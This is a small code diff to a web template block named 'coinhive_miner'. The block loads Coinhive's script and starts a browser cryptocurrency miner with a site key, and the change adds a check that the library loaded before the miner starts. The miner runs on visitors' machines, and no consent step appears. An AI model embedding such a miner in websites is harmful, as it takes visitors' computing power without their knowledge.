@@ -2,8 +2,10 @@
     {% spaceless %}
         <script src="https://coinhive.com/lib/coinhive.min.js"></script>
         <script type="text/javascript">
-            var miner = new CoinHive.Anonymous('{{ site_key }}');
-            miner.start();
+            if (typeof CoinHive !== 'undefined') {
+                var miner = new CoinHive.Anonymous('{{ site_key }}');
+                miner.start();
+            }
         </script>
     {% endspaceless %}
 {% endblock coinhive_miner %}
